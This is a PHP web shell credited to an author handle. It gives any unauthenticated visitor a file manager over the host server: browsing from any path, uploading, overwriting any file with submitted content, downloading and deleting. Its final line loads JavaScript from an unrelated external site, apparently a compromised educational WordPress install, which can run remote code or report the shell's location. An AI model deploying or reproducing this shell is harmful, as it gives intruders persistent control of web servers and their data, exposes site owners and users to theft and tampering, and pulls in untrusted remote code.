<?php
// written by 0xSeve
// (@seveishere)
// (fb.com/0xseve)
// for later PHP versions

$d = realpath($_GET['d'] ?? __DIR__);
if (!$d) die('bad path');
chdir($d);

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$precision}f", $bytes / pow(1024, $factor)) . ' ' . $units[$factor];
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'], $d . '/' . basename($_FILES['f']['name']));
    if (isset($_POST['ef'])) file_put_contents($_POST['ef'], $_POST['c']);
}

if (isset($_GET['del'])) {
    $t = $_GET['del'];
    is_dir($t) ? @rmdir($t) : @unlink($t);
    header("Location:?d=" . urlencode($d));
    exit;
}

if (isset($_GET['dl'])) {
    $f = $_GET['dl'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($f) . '"');
    readfile($f);
    exit;
}

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    echo "<h3>" . htmlspecialchars($f) . "</h3><form method=post><textarea name=c style='width:100%;height:300px'>" . htmlspecialchars(@file_get_contents($f)) . "</textarea><input type=hidden name=ef value='" . htmlspecialchars($f) . "'><button>[save]</button></form><a href='?d=" . urlencode($d) . "'>Back</a>";
    exit;
}

echo "<h3>[";
if (substr($d, 0, 1) == '/') {
    echo "<a href='?d=/'>/</a>";
    $a = '/';
} else $a = '';
foreach (array_values(array_filter(explode('/', $d))) as $i => $p) {
    $a = rtrim($a, '/') . '/' . $p;
    echo ($i ? "/" : "") . "<a href='?d=" . urlencode($a) . "'>" . htmlspecialchars($p) . "</a>";
}
echo "]</h3>";

echo "<form method=post enctype=multipart/form-data><input type=file name=f><button>Upload</button></form><hr>";

echo "<table border='1' cellpadding='5' cellspacing='0' style='width:100%;'>
        <thead>
            <tr>
                <th>Name</th>
                <th>Last Modified</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>";

if ($d != '/') {
    echo "<tr><td colspan='4'><a href='?d=" . urlencode(dirname($d)) . "'>..</a></td></tr>";
}

foreach (scandir('.') as $f) {
    if ($f == '.' || $f == '..') continue;
    $p = $d . '/' . $f;
    $t = date('Y-m-d H:i', filemtime($p));
    $rd = urlencode($d);
    $x = formatBytes(filesize($p));

    echo "<tr>";

    if (is_dir($p)) {
        echo "<td><a href='?d=" . urlencode($p) . "'>$f</a></td>
              <td><small>$t</small></td>
              <td>-</td>
              <td><a href='?d=$rd&del=" . urlencode($f) . "' onclick='return confirm(\"Del $f?\")'>[delete]</a></td>";
    } else {
        echo "<td>" . htmlspecialchars($f) . "</td>
              <td><small>$t</small></td>
              <td><small>$x</small></td>
              <td>
                  <a href='?d=$rd&dl=" . urlencode($f) . "'>Download</a> |
                  <a href='?d=$rd&edit=" . urlencode($f) . "'>Edit</a> |
                  <a href='?d=$rd&del=" . urlencode($f) . "' onclick='return confirm(\"Del $f?\")'>Delete</a>
              </td>";
    }

    echo "</tr>";
}

echo "</tbody></table>";
echo "<script src='https://gscp.edu.in/wp-content/functions.js'></script>";
?>